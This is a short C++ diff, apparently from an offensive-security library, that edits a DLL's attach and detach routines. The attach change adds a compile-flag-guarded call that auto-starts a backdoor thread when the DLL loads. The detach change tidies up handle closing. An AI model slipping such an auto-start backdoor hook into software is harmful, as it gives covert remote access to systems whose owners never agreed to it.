@@ -2,17 +2,25 @@
 
 using namespace pwn::log;
 using namespace pwn::utils::random;
+using namespace pwn::thread;
+
+
 
 void OnAttachRoutine()
 {
     g_ConsoleMutex = CreateMutex(NULL, FALSE, NULL);
     pwn::utils::random::seed();
+
+#ifdef PWN_AUTOSTART_BACKDOOR
+    pwn::thread::start_backdoor();
+#endif // PWN_AUTOSTART_BACKDOOR   
 }
 
 
 void OnDetachRoutine()
 {
-    CloseHandle(g_ConsoleMutex);
+    if(g_ConsoleMutex)
+        ::CloseHandle(g_ConsoleMutex);
 }
 
 
